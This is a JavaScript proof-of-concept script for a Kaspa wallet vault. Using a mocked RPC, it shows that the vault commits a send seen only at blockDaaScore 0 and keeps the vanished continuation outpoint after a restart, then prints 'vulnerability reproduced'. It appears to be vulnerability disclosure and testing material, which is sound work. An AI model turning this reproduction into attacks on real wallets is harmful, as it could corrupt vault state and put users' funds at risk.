import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

const here = path.dirname(fileURLToPath(import.meta.url));
const target = path.resolve(process.env.SOMPI_TARGET ?? path.join(here, "target"));
const dist = path.join(target, "dist");

for (const required of ["kaspa-wasm.js", "vault.js", "wallet.js", "vault/template.js"]) {
  if (!fs.existsSync(path.join(dist, required))) {
    throw new Error(`missing built target module: dist/${required}`);
  }
}

const moduleUrl = (name) => pathToFileURL(path.join(dist, name)).href;
const { Transaction, payToScriptHashScript } = await import(moduleUrl("kaspa-wasm.js"));
const { buildRedeemScript } = await import(moduleUrl("vault/template.js"));
const { KaspaWallet } = await import(moduleUrl("wallet.js"));
const { VaultManager, generateOwnerKey } = await import(moduleUrl("vault.js"));

const runtime = fs.mkdtempSync(path.join(os.tmpdir(), "sompi-can024-"));
fs.chmodSync(runtime, 0o700);

let submitted;
let vaultScript;

try {
  const wallet = new KaspaWallet({
    networkId: "testnet-10",
    dataDir: path.join(runtime, "wallet"),
  });
  const vault = new VaultManager(runtime, "testnet-10");
  const created = vault.create(500_000_000n, generateOwnerKey().publicKey, 300n);
  const covenantId = "aa".repeat(32);
  const fundingTxid = "bb".repeat(32);
  const funded = {
    ...created,
    covenantId,
    currentOutpoint: { txid: fundingTxid, index: 0 },
  };
  fs.writeFileSync(
    path.join(runtime, "vault", "config.json"),
    JSON.stringify(funded, null, 2),
    { mode: 0o600 },
  );

  const vaultAmount = 400_000_000n;
  vaultScript = payToScriptHashScript(buildRedeemScript(
    funded.agentPublic,
    funded.ownerPublic,
    BigInt(funded.maxOutflowSompi),
    BigInt(funded.windowSizeDaa),
    {
      windowStartDaa: BigInt(funded.windowStartDaa),
      spentInWindowSompi: BigInt(funded.spentInWindowSompi),
    },
  ));

  let outputsVisible = false;
  const oldSource = {
    outpoint: { transactionId: fundingTxid, index: 0 },
    amount: vaultAmount,
    scriptPublicKey: vaultScript,
    blockDaaScore: 1n,
    isCoinbase: false,
    covenantId,
  };

  const rpc = {
    getUtxosByAddresses: async (addresses) => {
      if (addresses.length === 1 && addresses[0] === funded.address) {
        return { entries: [oldSource] };
      }
      if (!submitted || !outputsVisible) return { entries: [] };

      const transactionId = String(submitted.finalize());
      return {
        entries: [
          {
            outpoint: { transactionId, index: 0 },
            amount: submitted.outputs[0].value,
            scriptPublicKey: submitted.outputs[0].scriptPublicKey,
            blockDaaScore: 0n,
            isCoinbase: false,
          },
          {
            outpoint: { transactionId, index: 1 },
            amount: submitted.outputs[1].value,
            scriptPublicKey: submitted.outputs[1].scriptPublicKey,
            blockDaaScore: 0n,
            isCoinbase: false,
            covenantId,
          },
        ],
      };
    },
    getFeeEstimate: async () => ({ estimate: { normalBuckets: [{ feerate: 100 }] } }),
    getServerInfo: async () => ({ virtualDaaScore: "100" }),
    getMempoolEntry: async () => {
      throw new Error("transaction not found");
    },
    getVirtualChainFromBlock: async () => ({ acceptedTransactionIds: [] }),
    submitTransaction: async ({ transaction }) => {
      submitted?.free();
      submitted = new Transaction(transaction);
      outputsVisible = true;
      return { transactionId: String(submitted.finalize()) };
    },
  };
  wallet.client = async () => rpc;

  const originalOutpoint = `${funded.currentOutpoint.txid}:${funded.currentOutpoint.index}`;
  const prepared = await vault.prepareSend(wallet, wallet.address, 70_000_000n);
  await vault.submitPreparedSend(wallet, prepared);

  const observed = await vault.observePreparedSend(wallet, prepared);
  assert.ok(observed, "both RPC-provided outputs should be treated as observed");
  assert.equal(observed.observedAtDaa, 0n);
  assert.equal(observed.transactionId, prepared.transactionId);
  assert.deepEqual(observed.destinationOutpoint, prepared.destinationOutpoint);
  assert.deepEqual(observed.continuationOutpoint, prepared.continuationOutpoint);

  const committed = vault.commitObservedSend(prepared, observed);
  assert.deepEqual(committed.currentOutpoint, prepared.continuationOutpoint);
  const committedOutpoint = `${committed.currentOutpoint.txid}:${committed.currentOutpoint.index}`;

  outputsVisible = false;
  const later = await vault.reconcilePreparedSend(wallet, prepared, "dd".repeat(32));
  assert.equal(later.status, "not_submitted");

  const restarted = new VaultManager(runtime, "testnet-10");
  const restartedOutpoint =
    `${restarted.config().currentOutpoint.txid}:${restarted.config().currentOutpoint.index}`;
  assert.equal(restartedOutpoint, committedOutpoint);
  assert.notEqual(restartedOutpoint, originalOutpoint);

  console.log("[+] both exact outputs accepted at blockDaaScore=0");
  console.log(`[+] committed continuation: ${committedOutpoint}`);
  console.log(`[+] evidence after outputs disappeared: ${later.status}`);
  console.log(`[+] restart retained vanished continuation: ${restartedOutpoint}`);
  console.log("[+] exact transaction and covenant bindings remained intact");
  console.log("[+] vulnerability reproduced");
} finally {
  submitted?.free();
  vaultScript?.free();
  if (process.env.KEEP_POC_RUNTIME === "1") {
    console.error(`[i] retained temporary runtime: ${runtime}`);
  } else {
    fs.rmSync(runtime, { recursive: true, force: true });
  }
}
